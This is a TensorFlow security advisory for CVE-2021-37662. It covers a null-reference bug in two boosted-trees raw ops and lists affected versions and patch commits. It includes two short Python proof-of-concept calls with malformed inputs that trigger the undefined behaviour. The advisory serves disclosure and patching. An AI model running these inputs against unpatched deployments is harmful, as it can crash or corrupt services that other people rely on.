# [M] Reference binding to nullptr in boosted trees

## Summary
Severity: Medium
Advisory: GHSA-f5cx-5wr3-5qrc
CVE: CVE-2021-37662
CWE: CWE-824
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2021-08-25
Source: https://github.com/advisories/GHSA-f5cx-5wr3-5qrc
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.3.4
- PyPI: `tensorflow` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow` — affected >=2.5.0 <2.5.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.3.4
- PyPI: `tensorflow-cpu` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow-cpu` — affected >=2.5.0 <2.5.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.3.4
- PyPI: `tensorflow-gpu` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow-gpu` — affected >=2.5.0 <2.5.1

## Details
### Impact
An attacker can generate undefined behavior via a reference binding to nullptr in `BoostedTreesCalculateBestGainsPerFeature`:

```python
import tensorflow as tf

tf.raw_ops.BoostedTreesCalculateBestGainsPerFeature(
  node_id_range=[],
  stats_summary_list=[[1,2,3]],
  l1=[1.0],
  l2=[1.0],
  tree_complexity =[1.0],
  min_node_weight =[1.17],
  max_splits=5)
```

A similar attack can occur in `BoostedTreesCalculateBestFeatureSplitV2`:

```python
import tensorflow as tf
                                                                                                                                                                                                                                                                                          
tf.raw_ops.BoostedTreesCalculateBestFeatureSplitV2(
  node_id_range=[],
  stats_summaries_list=[[1,2,3]],
  split_types=[''],
  candidate_feature_ids=[1,2,3,4],
  l1=[1],     
  l2=[1],
  tree_complexity=[1.0],
  min_node_weight=[1.17],
  logits_dimension=5)
```     
    
The  [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/boosted_trees/stats_ops.cc) does not validate the input values.

### Patches
We have patched the issue in GitHub commit [9c87c32c710d0b5b53dc6fd3bfde4046e1f7a5ad](https://github.com/tensorflow/tensorflow/commit/9c87c32c710d0b5b53dc6fd3bfde4046e1f7a5ad) and in commit. [429f009d2b2c09028647dd4bb7b3f6f414bbaad7](https://github.com/tensorflow/tensorflow/commit/429f009d2b2c09028647dd4bb7b3f6f414bbaad7).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. 

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f5cx-5wr3-5qrc
- https://nvd.nist.gov/vuln/detail/CVE-2021-37662
- https://github.com/tensorflow/tensorflow/commit/429f009d2b2c09028647dd4bb7b3f6f414bbaad7
- https://github.com/tensorflow/tensorflow/commit/9c87c32c710d0b5b53dc6fd3bfde4046e1f7a5ad
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2021-575.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2021-773.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow/PYSEC-2021-284.yaml
- https://github.com/tensorflow/tensorflow
